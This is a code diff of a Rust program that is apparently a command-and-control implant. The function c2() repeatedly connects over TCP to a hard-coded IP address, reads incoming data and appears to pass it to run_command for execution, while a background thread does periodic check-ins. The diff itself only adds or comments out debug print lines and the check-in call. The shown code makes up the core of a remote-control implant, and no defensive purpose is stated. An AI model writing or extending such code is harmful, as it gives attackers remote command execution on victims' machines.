@@ -21,7 +21,7 @@ fn connect(ip: &str) -> TcpStream {
                 return con;
             },
             Err(_) => { //if it errored, print that it is trying to connect and re-loop
-                // println!("trying to connect");
+                println!("trying to connect");
                 thread::sleep(time::Duration::from_millis(2000));
                 continue;
             }
@@ -41,7 +41,9 @@ fn run_command(cmd: &str) -> String {
 
 
 fn c2(ip:&str) {
+    println!("{}","in c2");
     let mut stream = connect(ip); //connects via TCP
+    println!("{}","connected");
     loop {
         let mut buffer = [0;1024]; //set the buffer
         let num_of_bytes = stream.read(&mut buffer).unwrap_or(0);
@@ -91,7 +93,7 @@ fn checkIn(){
     thread::spawn(|| {
         loop{
             thread::sleep(time::Duration::from_millis(2000)); //sleep for 2 seconds
-            println!("{}","checking in!");
+            // println!("{}","checking in!");
         }
     });
 }
@@ -100,6 +102,6 @@ fn checkIn(){
 fn main(){
     // let ip = "129.21.49.57:5678";
     let ip = "127.0.0.1:8080";
-    checkIn();
+    // checkIn();
     c2(&ip);
 }
